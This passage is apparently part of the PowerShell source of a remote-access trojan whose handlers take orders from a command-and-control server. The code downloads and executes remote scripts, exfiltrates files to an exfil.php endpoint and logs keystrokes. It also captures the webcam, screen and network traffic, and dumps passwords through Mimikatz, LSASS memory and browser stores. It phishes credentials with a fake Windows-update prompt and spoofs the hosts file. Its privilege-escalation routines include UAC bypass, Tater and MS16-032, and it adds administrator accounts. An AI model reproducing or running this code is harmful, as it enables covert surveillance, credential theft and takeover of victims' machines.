	[string] $url="$c2c/ROOT_FOLDER/exfil.php?pc=$pc";
	$exfil = $http.UploadFile($url,$Path);
	}		
for($i = 1; $i -lt 254; $i++) {
	$ipAddress = "$StartAddress.$i"
	Invoke-SMBEnum -Target $ipAddress -Domain $DomainOrWorkgroup -Username $username -Hash $hash| set-content $env:userprofile\AppData\enumshare.txt;
	}
Exfilt "$env:userprofile\AppData\enumshare.txt"
"@
			RunJob -code $Command
			$result = "enumshare.txt" 
			sendC2 $pc $result $id
			}
		Function EnumSessionCommand { #!enumsession|toto|F8580EAGFH89725
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $username = $LatestOrder.split('|')[1]
			[string] $hash = $LatestOrder.split('|')[2]
			$command = @"
IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pthshareenum.txt"));
$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$w = $ip.split('.')[0]
$x = $ip.split('.')[1]
$y = $ip.split('.')[2]
$z = $ip.split('.')[3]
$StartAddress = "$w.$x.$y"
function Exfilt{
	[CmdletBinding()] param( 
	[string] $Path
	) 
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback={true};
	$http = new-object System.Net.WebClient;
	[string] $url="$c2c/ROOT_FOLDER/exfil.php?pc=$pc";
	$exfil = $http.UploadFile($url,$Path);
	}		
for($i = 1; $i -lt 254; $i++) {
	$ipAddress= "$StartAddress.$i"
	Invoke-SMBEnum -Target $ipAddress -Domain $DomainOrWorkgroup -Username $username -Hash $hash -Action NetSession| set-content $env:userprofile\AppData\enumsession.txt;
}
Exfilt "$env:userprofile\AppData\enumshare.txt"
"@
			RunJob -code $command
			$result = "enumshare.txt" 
			sendC2 $pc $result $id
			}			
        Function WannacryCheckCommand {		# !wcry	
			#MS17-010 Wannacry Checker
			[CmdletBinding()] param( 
			[string]$id
			)
			$hotfixes = "KB3205409", "KB3210720", "KB3210721", "KB3212646", "KB3213986", "KB4012212", "KB4012213", "KB4012214", "KB4012215", "KB4012216", "KB4012217", "KB4012218", "KB4012220", "KB4012598", "KB4012606", "KB4013198", "KB4013389", "KB4013429", "KB4015217", "KB4015438", "KB4015546", "KB4015547", "KB4015548", "KB4015549", "KB4015550", "KB4015551", "KB4015552", "KB4015553", "KB4015554", "KB4016635", "KB4019213", "KB4019214", "KB4019215", "KB4019216", "KB4019263", "KB4019264", "KB4019472", "KB4015221", "KB4019474", "KB4015219", "KB4019473"
			$hotfix = Get-HotFix -ComputerName $env:computername | Where-Object {$hotfixes -contains $_.HotfixID} | Select-Object -property "HotFixID"
			if (Get-HotFix | Where-Object {$hotfixes -contains $_.HotfixID})
			{
			$result = "Patched against WannaCry"
			} else {
			$result = "Vulnerability MS17-010 found for WannaCry"
			}
			sendC2 $pc $result $id
		}
		Function ExplorerCommand { #!explorer|1|c:\users   - Explore folders and files.  list shared folders ?   1 = yes,   0 = no
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $listshares = $LatestOrder.split('|')[1]
            [string] $startpath = $LatestOrder.split('|')[2]
			$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
			$devideID = Get-WmiObject win32_networkadapterconfiguration | where {$_.IPAddress -eq $ip} | select SettingID
			$w = $ip.split('.')[0]
			$x = $ip.split('.')[1]
			$y = $ip.split('.')[2]
			$z = $ip.split('.')[3]
			set-content ".\share-$pc.txt" -Value "===================FILES AND FOLDERS EXPLORER==============================="		
			if ($listshares -eq "1") {
				for($i=1; $i -le 254; $i++){
				$ipAddress= "$w.$x.$y.$i"
				$hostdnsname = [System.Net.Dns]::GetHostByAddress($ipAddress).Hostname
				if ($hostdnsname) {
					add-content ".\share-$pc.txt" -Value "===================SHARES : $hostdnsname/$ipAddress==============================="
					get-WmiObject -class Win32_Share -computer $hostdnsname | add-content ".\share-$pc.txt"
					}
				}
			}
			if ($startpath) {
				add-content ".\share-$pc.txt" -Value "===================List local folders/$startpath==============================="
				Tree $startpath /F | Select-Object -Skip 2 | add-content ".\share-$pc.txt"
			}
			$result = "Wait and exfiltrate $env:userprofile\AppData\share-$pc.txt" 
			sendC2 $pc $result $id
		} 		
    	Function CheckWMICommand { #!checkwmi
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) {
			[string]$result = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
			#$result += Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
			} else { $result = "Not admin"}
			sendC2 $pc $result $id
		}
		Function ExtractKeyCommand { # !extractkey    OR remotely: !extractkey|domain\admin|password 
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $user = $LatestOrder.split('|')[1]
			[string] $pass = $LatestOrder.split('|')[2]
			if ($IsAdmin -eq $True) { 
			IEX(New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/SessGopher.txt")
				if (!$user) {[string]$result = Invoke-SessionGopher -Thorough}
				else {[string]$result = Invoke-SessionGopher -AllDomain -u $user -p $pass}
			}else {$result = "Not admin"}
			sendC2 $pc $result $id
		}	
	# Throlling  > BEGIN
		Function UrlCommand { # !url|iexplore.exe|on / off|http://www.youtube.com/watch?v=dQw4w9WgXcQ
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $browser = $LatestOrder.split('|')[1]
			[string] $visibility = $LatestOrder.split('|')[2]
			[string] $webpage = $LatestOrder.split('|')[3]
			if ($browser -eq "iexplore.exe") {
				$IE=new-object -com internetexplorer.application
				if ($visibility -eq "on") {$IE.visible=$false}
				$IE.navigate2("$webpage")				
			}else {
				if ($visibility -eq "on") {Start-Process -WindowStyle Hidden "$browser" "$webpage"}
				else {Start-Process "$browser" "$webpage"}
			}
			$result = "Web page opened"
			sendC2 $pc $result $id
        }
        Function SpeakCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $AudioMessage = $LatestOrder.split('|')[1]
            
            #Raise the volume to make sure they hear us
            1..50 | Foreach {
                    $WscriptObject = New-Object -com wscript.shell
                    $WscriptObject.SendKeys([char]175)
                }
            
            #Create a COM object to pass the message to
            $ComVoiceObject = New-Object -ComObject SAPI.SpVoice
            [void] $ComVoiceObject.Speak($AudioMessage)
			$result = 'ok'
			sendC2 $pc $result $id
        }            
        Function WallpaperCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $downloadURL = $LatestOrder.split('|')[1]
            [string] $FileOnDisk =  $LatestOrder.split('|')[2]

            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
            $WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedImage = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
            Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name wallpaper -Value $FileOnDisk
            [string] $CmdString = 'rundll32.exe user32.dll, UpdatePerUserSystemParameters'
            Invoke-Expression $CmdString
			$result = 'ok'
			sendC2 $pc $result $id
        }
		Function EicarCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/eicar.txt"))
			$result = 'ok'
			sendC2 $pc $result $id
        } 
        Function PopupCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $PopupMessage = $LatestOrder.split('|')[1]
            [string] $PopupTitle = $LatestOrder.split('|')[2]
            Add-Type -AssemblyName "System.Drawing","System.Windows.Forms"
            [Windows.Forms.MessageBox]::Show($PopupMessage, $PopupTitle, [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)
			$result = 'ok'
			sendC2 $pc $result $id
		}
        Function ThunderCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $VideoURL = $LatestOrder.split('|')[1]
            if ($VideoURL -eq $null) {
                [string] $VideoURL = "http://www.youtube.com/watch?v=v2AC41dglnM"
            }

            $IEComObject = New-Object -com "InternetExplorer.Application"
            $IEComObject.visible = $False
            $IEComObject.navigate($VideoURL)
            $EndTime = (Get-Date).addminutes(3)
                do {
                    $WscriptObject = New-Object -com wscript.shell
                    $WscriptObject.SendKeys([char]175)
                }
                
                until ((Get-Date) -gt $EndTime)
			$result = 'ok'
			sendC2 $pc $result $id
        }
	# Spy the user  > BEGIN
		Function KeylogCommand { #!keylog|on / off
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $IsActivated = $LatestOrder.split('|')[1]
			if ($IsActivated -eq "on"){
			$ScriptBlock = {   
 			$command = @"
IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/klog.txt")
"@ 
				[string] $CmdPath = "$env:windir\System32\cmd.exe"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
				Invoke-Expression $CmdString
				}
				Start-job -Name keyboard -InitializationScript $ScriptBlock -ScriptBlock {for (;;) {ModLogKey}} | Out-Null
			}
			else {
				if (Test-Path "$env:userprofile\k.log") {
					Stop-job -Name keyboard
					$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
					Rename-Item $env:userprofile\k.log k-$date.log
					[string]$result = Get-ChildItem -Path $env:userprofile\k-$date.log		
					Exfiltrate $env:userprofile\k-$date.log
					Remove-Item $env:userprofile\k-$date.log
				}
			}
			$result = "ok"	
			sendC2 $pc $result $id
        }       
		Function SniffCommand { # !sniff|10
			[CmdletBinding()] param( 
			[string]$id
			)
			md "$env:userprofile\appdata\local\temp\net"
            [int32] $CaptureLength = $LatestOrder.split('|')[1]
            [string] $Path = "$env:userprofile\appdata\local\temp\net" 
            [string] $TraceID = [System.Guid]::NewGuid().ToString()
			[string] $TracePack = "$TraceID.cab"
            [string] $TraceFile = "$TraceID.etl"
			[string] $TraceFilePath = (Join-Path $Path $TraceFile)
			[string] $TracePackPath = (Join-Path $Path $TracePack)
			$EndTime = (Get-Date).addminutes($CaptureLength)        
            function CapturePcap {
                netsh trace start capture=yes maxSize=20MB overwrite=yes traceFile=$TraceFilePath
				}
            function Cleanup {
                netsh trace stop						
				Exfiltrate $TraceFilePath
				Exfiltrate $TracePackPath
				Remove-Item $Path -Recurse
			}      
            if ($IsAdmin -eq $True) {
                Start-Job -scriptblock {CapturePcap} | Out-Null
                do {Start-Sleep -Seconds 1 }
                until ((Get-Date) -gt $EndTime) {
                    Cleanup
                    Start-Sleep -Seconds 10
                    Get-Job | Remove-Job -Force        
                }
				$result = "$TraceFilePath"
            } else { $result = "Not Admin" }
			
			sendC2 $pc $result $id
	   }
        Function WebcamCommand {
			[CmdletBinding()] param( 
			[string]$id
			)			
			# Test Path 
			[string] $name = Get-Random -minimum 1 -maximum 999999
			$exists = "$env:userprofile\AppData\cm.exe"
			If (Test-Path $exists){
			# take webcam shot			
			[string] $Command = "$env:userprofile\AppData\cm.exe /filename $name.bmp /delay 10000"
			executer -runLocal $Command
			$name = $name+".bmp"
			Exfiltrate $env:userprofile\$name
			$result = "$name";
			sendC2 $pc $result $id
			}
			else {
			#md "$env:userprofile\cm"
			#attrib +h "$env:userprofile\cm"
			[string] $name = Get-Random -minimum 1 -maximum 9999
			[string] $downloadURL = "$c2c/ROOT_FOLDER/link/cm.txt"
            [string] $FileOnDisk =  "$env:userprofile\AppData\cm.txt"
			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
			#Convert txt to exe
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\AppData\cm.exe", $temp)
			attrib +h "$env:userprofile\AppData\cm.exe"
			# take webcam shot			
			[string] $Command = "$env:userprofile\AppData\cm.exe /filename $name.bmp /delay 10000"
            [string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Invoke-Expression $CmdString
			ls | findstr "$name" | foreach { $path = Resolve-Path $_.FullName ; Exfiltrate $path; $pathlink = "";  $result = "$result `n  $pathlink "; }
			sendC2 $pc $result $id
			#del "$env:userprofile\AppData\cm.exe"
			Remove-Item -path "$env:userprofile\AppData\cm.txt"
			Remove-Item -path "$env:userprofile\$name"
			Remove-Item -path "$env:userprofile\$name.bmp"
				}
			}
		Function ScreenshotCommand { # !screenshot - take screen capture
           [CmdletBinding()] param( 
			[string]$id
			)
			$result = screencapture					
			sendC2 $pc $result $id
			} 
		Function ScreenStreaming {	# !streaming|on / off - take screenshot at every hello (active spy)	
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $isactivated = $LatestOrder.split('|')[1]
			if ($isactivated -eq "on"){
				$ScreenstreamActivated = "on"
			}
			else{$ScreenstreamActivated = "off"
			}
			$result = "Screen streaming is activated"
			sendC2 $pc $result $id
			}
        Function GeolocateCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($pshversion -lt 3) {
				$command = "$env:userprofile\AppData\cl.exe http://ip-api.com/xml"
				[string] $CmdPath = "$env:windir\System32\cmd.exe"
				[string] $CmdString = "$CmdPath" + " /C " + "$command"
				[xml]$XMLgeo = Invoke-Expression $CmdString			
				} 
			else {
				[xml]$XMLgeo = (Invoke-WebRequest http://ip-api.com/xml).Content }
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//lat'))		{
			$lat = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//lon'))		{
					$lon = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//country'))		{
					$country = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//city'))		{
					$city = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//regionName'))		{
					$region = $node.Node.InnerText.Trim()
				}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//timezone'))		{
					$timezone = $node.Node.InnerText.Trim()
					}
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//isp'))		{
					$isp = $node.Node.InnerText.Trim()
				}	
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//org'))		{
					$org = $node.Node.InnerText.Trim()
				}	
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//as'))		{
					$as = $node.Node.InnerText.Trim()
				}	
			foreach ($node in @($XMLgeo | Select-Xml -XPath '//query'))		{
					$public_ip = $node.Node.InnerText.Trim()
				}
			$map = "https://www.google.com/maps/search/?api=1&query="+"$lat"+","+"$lon";
			$result = "$map ---->   PUBLIC IP: $public_ip  - COUNTRY: $country  - CITY: $city - REGION: $region - TIMEZONE: $timezone - ISP: $isp - ORG: $org - AS: $as"
			sendC2 $pc $result $id
			}	
		Function GeolocateGPSCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
			$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
			$GeoWatcher.Start() #Begin resolving current locaton
			while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
				Start-Sleep -Milliseconds 100 #Wait for discovery.
			}  
			if ($GeoWatcher.Permission -eq 'Denied'){
				Write-Error 'Access Denied for Location Information'
			} else {
				$lat = $GeoWatcher.Position.Location | Select Latitude
				$lon = $GeoWatcher.Position.Location | Select Longitude 				
			}
			$map = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red%7Clabel:Z%7C"+"$lat"+","+"$lon"+"&maptype=hybrid";
			$result = "GOOGLE MAP GPS: `n <img src=$map>Geolocation map</img>";
			sendC2 $pc $result $id	
			}
	# Credentials dumping  > BEGIN
		Function CredentialCommand { # !credential   -  creds phishing attempt
			[CmdletBinding()] param(
			[string]$id
			)
			Add-Type -AssemblyName "System.Drawing","System.Windows.Forms"
			[Windows.Forms.MessageBox]::Show("Criticals Windows update failed !`n Please contact your administrator", "Windows update failed", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Warning)
			$credential = Get-Credential
			$pass = $credential.GetNetworkCredential().password
			$dom = $credential.GetNetworkCredential().Domain
			$login = $credential.GetNetworkCredential().UserName
			$logindom = "$dom\$login"
			if ($dom){[string]$usercreds = "$usercreds - login:$logindom - pass:$pass"
				$credsObject = @{Username=$logindom; Password=$pass}
				}
			else{[string]$logindom = "$login";
				[string]$usercreds = "$usercreds - login:$logindom - pass:$pass"
				$credsObject = @{Username=$login; Password=$pass}
				}
			$credsObject.Username
			$credsObject.Password
			$passencrypted = convertto-securestring $pass -asplaintext -force
			IEX(New-Object Net.WebClient).DownloadString("http://127.0.0.1/clyps/link/testcreds.txt");
			[string] $ispassvalid = Test-UserCredential -user $credsObject.Username -password $passencrypted
			Write-Host $ispassvalid
			while ($ispassvalid -eq "False") {
				[Windows.Forms.MessageBox]::Show("Authentication failed - please verify your username and password.", "Windows update failed", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Warning)
				Add-Type -AssemblyName "System.Drawing","System.Windows.Forms"
				[Windows.Forms.MessageBox]::Show("Criticals Windows update failed !`n Please contact your administrator", "Windows update failed", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Warning)
				$credential = Get-Credential
				$pass = $credential.GetNetworkCredential().password
				$dom = $credential.GetNetworkCredential().Domain
				$login = $credential.GetNetworkCredential().UserName
				$logindom = "$dom\$login"
				if ($dom){[string]$usercreds = "$usercreds - login:$logindom - pass:$pass"
					$credsObject = @{Username=$logindom; Password=$pass}
					}
				else{[string]$logindom = "$login";
					[string]$usercreds = "$usercreds - login:$logindom - pass:$pass"
					$credsObject = @{Username=$logindom; Password=$pass}
					}
				$passencrypted = convertto-securestring $pass -asplaintext -force
				$ispassvalid = Test-UserCredential -user $credsObject.Username -password $passencrypted
				Write-Host $ispassvalid
				if ($ispassvalid -eq "True") {
					echo "valide pass"
					break
					}
				}
			$result = "$credsObject - login:$logindom - pass:$pass"
			$result 
			sendC2 $pc $result $id
		}
		Function PhishingCommand { # !phish|facebook.com|http://xxxx.ngok.io/facebook  -  start local http server, host phishing page and spoof DNS hosts.txt
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $SiteToPhish = $LatestOrder.split('|')[1]
			[string] $Redirect_PhishingURL = $LatestOrder.split('|')[2]
			$Command = @"
IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pshttp.txt"));
PsHttp -BINDING "http://127.0.0.1:80" -REDIRECTTO $Redirect_PhishingURL
"@
			netsh advfirewall firewall add rule name="Http port 80" dir=in action=allow protocol=TCP localport=80
			netsh advfirewall firewall add rule name="Http port 80" dir=out action=allow protocol=TCP localport=80 
			RunJob -code $Command;
			# write on hosts.txt
			$g = get-content "C:\Windows\System32\drivers\etc\hosts.txt"
			add-content "C:\Windows\System32\drivers\etc\hosts.txt" -Value "127.0.0.1	$SiteToPhish"
			$result = "ok";
			sendC2 $pc $result $id
		   }   
		Function HttpServerCommand { # !http|8080  -  setup local http server and host a page 
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $httpport = $LatestOrder.split('|')[1]
			md $env:userprofile\AppData\w;
			$httppath = "$env:userprofile\AppData\w";
			(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/link/redir.html","$env:userprofile\AppData\w\index.html")
			(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/link/http.txt","$env:userprofile\AppData\http.exe")
			downloadFile "$c2c/ROOT_FOLDER/link/http.txt" "$env:userprofile\AppData\http.exe"
			attriib +h $env:userprofile\AppData\http.exe
			$Command = "$env:userprofile\AppData\http.exe $httppath $httpport";
			RunJob -code $Command;
			$result = "ok";
			sendC2 $pc $result $id;
		   }     
        Function MmikatzCommand {   # !mimikatz -  dump windows pass
			[CmdletBinding()] param( 
			[string]$id
			)
			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/mMktZ.txt"))
			[string] $rs = "" 
			$rs += mMktZ -Command "privilege::debug" 
			$rs += "`n`n "
			$rs += mMktZ -Command "sekurlsa::logonpasswords" 
			$rs += "`n`n "
			$rs += mMktZ -DumpCreds
			$rs += "`n`n "
			$rs += mMktZ -Command "sekurlsa::ekeys" 
			# mMktZ  -Command "log sekurlsa.log"
			$rs += "`n`n  ----------------------------------------- "
			$rs += "YOU CAN PASS THE HASH with rc4_hmac_nt, rc4_hmac_old ... : mMktZ -Command sekurlsa::pth /user:Administrateur /domain:corporate.local /ntlm:cc36cf7a8514893efccd332446158b1a"
			set-content $env:userprofile\AppData\pass.txt -Value $rs
			exfiltrate $env:userprofile\AppData\pass.txt
			$result = "ok"
			Remove-Item $env:userprofile\AppData\pass.txt
			sendC2 $pc $result $id
			}
        Function RemoteMmikatzCommand {   # !remotemimikatz -  dump windows pass remotely
			[CmdletBinding()] param( 
			[string]$id
			)
			IEX (New-Object Net.WebClient).DownloadString("https://is.gd/oeoFuI")
			[string] $rs = "" 
			$rs += Invoke-Mimikatz -Command "privilege::debug" 
			$rs += "`n`n "
			$rs += Invoke-Mimikatz -Command "sekurlsa::logonpasswords" 
			$rs += "`n`n "
			$rs += Invoke-Mimikatz -DumpCreds
			$rs += "`n`n "
			$rs += Invoke-Mimikatz -Command "sekurlsa::ekeys" 
			#Invoke-Mimikatz -Command "log sekurlsa.log"
			$rs += "`n`n  ----------------------------------------- "
			$rs += "YOU CAN PASS THE HASH with rc4_hmac_nt, rc4_hmac_old ... : Invoke-Mimikatz -Command sekurlsa::pth /user:Administrateur /domain:corporate.local /ntlm:cc36cf7a8514893efccd332446158b1a"
			$result = $rs
			sendC2 $pc $result $id
			}
		Function BrowserDumpCommand { # !browserdump - dump chrome and firefox pass
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) {
			$command = @"
IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/chr-dump.txt"));Get-ChromeDump -OutFile chrpwd.txt
"@ 
			$command2 = @"
IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/chr-dump.txt"));Get-FoxDump -OutFile ffpwd.txt
"@ 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$command"
			[string] $CmdString2 = "$CmdPath" + " /C " + "$command2"
            Invoke-Expression $CmdString
			Invoke-Expression $CmdString2
			[string]$r1 = ls | findstr "chrpwd" 
			[string]$rr1 = ls | findstr "ffpwd" 
			[string]$r2 = "$c2c/ROOT_FOLDER/exfil/$pc/chrpwd.txt"
			[string]$rr2 = "$c2c/ROOT_FOLDER/exfil/$pc/ffpwd.txt"
			$result = "$r1 - $r2 - $rr1 -  $rr2"			
			Exfiltrate .\chrpwd.txt
			Exfiltrate .\ffpwd.txt
			} else {
			$result = "Not admin ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command !hashdump"
				}
			sendC2 $pc $result $id
		}
		Function hashdumpCommand { # !hashdump -  Hash dump
            [CmdletBinding()] param( 
			[string]$id
			)
			[string]$result = iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/hshdump.txt"))
			#$result
			sendC2 $pc $result $id
		   }
		Function ProccessDumpCommand { # !procdump - dump hash from process and use offline mimikatz to extract clear text
            [CmdletBinding()] param( 
			[string]$id
			)
			if($env:PROCESSOR_ARCHITECTURE -eq "x86")
			{
			$downloadURL = "$c2c/ROOT_FOLDER/link/proc32.txt"
			[string] $FileOnDisk =  "$env:userprofile\AppData\proc32.txt"
			if ($downloadURL.Substring(0,5) -ceq "https") {
				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
			}
			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
			rename-item $FileOnDisk -NewName proc.exe
			Write-Host "ProcdessDump 32.." -ForegroundColor DarkGreen;
			attrib +h "$env:userprofile\AppData\proc.exe"
			}
		Else{ 
			$downloadURL = "$c2c/ROOT_FOLDER/link/proc64.txt"
			[string] $FileOnDisk =  "$env:userprofile\AppData\proc64.txt"
			if ($downloadURL.Substring(0,5) -ceq "https") {
				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
				}
			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
			rename-item $FileOnDisk -NewName proc.exe
			Write-Host "ProcessDump 64.." -ForegroundColor DarkGreen
			attrib +h "$env:userprofile\AppData\proc.exe"
			}
			$Command = "$env:userprofile\AppData\proc.exe -accepteula -ma lsass.exe $env:userprofile\AppData\procdump.dmp";
			RunJob -code $Command;
			Start-Sleep -Seconds 60
			exfiltrate $env:userprofile\AppData\procdump.dmp
			[String] $result += Get-ChildItem $env:userprofile\AppData\procdump.dmp
			$result +="Open dump file with Mimikatz to retrieve the creds --> mimikatz # sekurlsa::minidump procdump.dmp  AND >mimikatz # sekurlsa::logonPasswords"
			sendC2 $pc $result $id;
		   }		   
	# Privileges escalation  > BEGIN
		Function PrivescCommand {  # !privesc
			[CmdletBinding()] param( 
			[string]$id
			)
			[String]$rs =""
            #if ($IsAdmin -eq $True) {
			#	IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/token.txt"));
			#	Invoke-TokenManipulation -ImpersonateUser -Username 'nt authority\system';
            #}
			
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/Invoke-MS16-032.txt"))
			[string]$rs += "------------------------Invoke_MS16_032 :"
			$rs += Invoke-MS16-032
			$rs += "------------------------SHERLOCK - Privesc All Checks : "
			iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/sherlock.txt"))
			$rs += Find-AllVulns
			$rs += "------------------------POWERUP - Privesc All Checks : "
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/powerup.txt"))
			$rs += Invoke-AllChecks
			set-content .\privesc-vulns.txt -Value $rs
			Start-Sleep -Seconds 80
			$result += "Open privesc-vulns.txt -- WHO AM I : "
			$result += whoami
			exfiltrate .\privesc-vulns.txt
			Remove-Item .\privesc-vulns.txt
			sendC2 $pc $result $id
        }
		Function GetsystemCommand { # !getsystem - Try various privesc technic (obtain PID like !getpid|lsass)
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $cnd = "cmd /c powershell -exe bypass -Nol -win hidden -enc $myAgntencoded"
			#Method 1
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/psgetsys2.txt"))
			Get-System
			$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
			#Method 2
			if ($IsAdmin -eq $False) {Get-System -Technique Token}
			$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
			#Method 3
			if ($IsAdmin -eq $False) {
				(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/link/psgetsys.ps1","$env:userprofile\psgetsys.ps1")
				import-module $env:userprofile\psgetsys.ps1;
				$system_pid = get-process "lsass" |select -expand id
				[MyProcess]::CreateProcessFromParent($system_pid,$cnd)
			}
			$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
			$who = whoami
			Start-Sleep -Seconds 80
			$result = "$who "			
			sendC2 $pc $result $id
		}
		Function ElevateCommand { # !elevate|IEX(New-Object Net.WebClient).DownloadString("http://c2/link/pnt.ps1"))
            [CmdletBinding()] param( 
			[string]$id
			)	
			[string] $cmdtoexec = $LatestOrder.split('|')[1]
            if ($IsAdmin -eq $False) {
				$CmdArgs = "-Exe Bypass -NoL $cmdtoexec"
                $CmdString = "Start-Process PowerShell.exe -Verb RunAs -ArgumentList $CmdArgs"
                Invoke-Expression $CmdString  
			$result ='ok. you can run !run|exit, if you want to avoid concurrent non-privileged execution'
			sendC2 $pc $result $id
            }
			else {
				$result ="Already in ADMIN session. Simply use !run"
				sendC2 $pc $result $id
			}
        }
		Function BypassUacCommand { # !bypassuac|net user toto /add   OR !bypassuac (to use default pnt base64)
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $cmd = $LatestOrder.split('|')[1] 
			[string] $rs = "" 
			if(!$cmd){
				$cmd = "cmd /c powershell -exe bypass -win hidden -enc $myAgntencoded"
			}
			$rs += Invk-EvtVwrBypass -Command "$cmd"
			$result = $rs		
			sendC2 $pc $result $id
			}
		Function Hotpotatoes {	# !hotpotatoes|net user tater Winter2016 /add && net localgroup administrators tater /add
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $torunas = $LatestOrder.split('|')[1]
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/Tater.txt"))
			Invoke-Tater -Trigger 2 -Command '$torunas'
			[string]$result = Invoke-Tater -Trigger 2 -Command '$torunas'
			sendC2 $pc $result $id
			}
		Function AddUserCommand { # !adduser|johndoe|p@s5w0rd|on      on = add to domain
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $login = $LatestOrder.split('|')[1]
			[string] $passwdd = $LatestOrder.split('|')[2]
			[string] $domain = $LatestOrder.split('|')[3]
			if ($domain -eq "on") {
				net user $login $passwdd /add /domain
				net group administrators $login /add
				net group administrateurs $login /add
				} 
			else{
				net user $login $passwdd /add
				net group administrators $login /add
				net localgroup administrateurs $login /add
				}
			$result = net user $login
			sendC2 $pc $result $id
		}
	# Persistence & Propagation  > BEGIN
		Function UsbspreadCommand {  # !usbspread|on
			[CmdletBinding()] param( 
			[string]$id
			)
